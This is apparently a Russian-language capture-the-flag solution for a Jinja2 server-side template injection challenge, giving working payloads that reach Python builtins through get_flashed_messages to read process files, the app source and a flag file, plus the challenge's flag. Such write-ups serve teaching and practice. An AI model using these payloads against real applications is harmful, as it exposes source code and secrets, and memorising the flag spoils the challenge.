# Решение

## Идея
Пользовательский ввод рендерится как Jinja2-шаблон. Через builtins можно читать файлы в контейнере.

## Эксплуатация
1. Проверить, что выражения выполняются:

```
{{ 7*7 }}
```

2. Прочитать командную строку процесса:

```
{{ get_flashed_messages.__globals__.__builtins__.open('/proc/self/cmdline').read() }}
```

3. Прочитать исходник приложения и увидеть импорт модуля с флагом:

```
{{ get_flashed_messages.__globals__.__builtins__.open('/proc/self/cwd/app.py').read() }}
```

4. Прочитать файл с флагом:

```
{{ get_flashed_messages.__globals__.__builtins__.open('/proc/self/cwd/flageeeeerrrrr.py').read() }}
```

## Флаг
`FECTF{ssti_can_be_safe_but_not_here}`
